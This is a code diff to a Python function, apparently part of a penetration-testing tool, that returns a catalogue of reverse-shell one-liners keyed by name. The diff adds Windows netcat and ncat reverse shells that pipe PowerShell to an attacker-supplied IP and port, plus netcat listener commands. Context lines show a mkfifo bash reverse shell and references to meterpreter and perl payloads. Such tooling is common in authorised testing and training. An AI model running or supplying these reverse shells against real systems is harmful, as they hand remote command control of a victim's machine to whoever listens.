@@ -160,6 +160,12 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "listen": "rlwrap -cAr nc -lvnp %d" % (port),
     }
 
+    netcat_windows = {
+        "description": "Windows Netcat reverse shell",
+        "reverse": "nc.exe -e powershell.exe %s %d" % (ipaddr, port),
+        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
+    }
+
     ncat = {
         "description": "Ncat reverse shell",
         "reverse": 'ncat %s %d -e /bin/bash' % (ipaddr, port),
@@ -173,6 +179,12 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u %s %d >/tmp/f' % (ipaddr, port),
         "listen":
         "rlwrap -cAr nc -luvnp %d" % (port),
+    }
+
+    ncat_windows = {
+        "description": "Windows Ncat reverse shell",
+        "reverse": "ncat.exe %s %d -e powershell.exe" % (ipaddr, port),
+        "listen": "rlwrap -cAr nc -lvnp %d" % (port),
     }
 
     node = {
@@ -355,8 +367,10 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "lin32-met": linux32_meterpreter,
         "nc": netcat,
         "nc-mkfifo": netcat_mkfifo,
+        "nc-win": netcat_windows,
         "ncat": ncat,
         "ncat-udp": ncat_udp,
+        "ncat-win": ncat_windows,
         "node": node,
         "perl": perl,
         "perl-win": perl_windows,
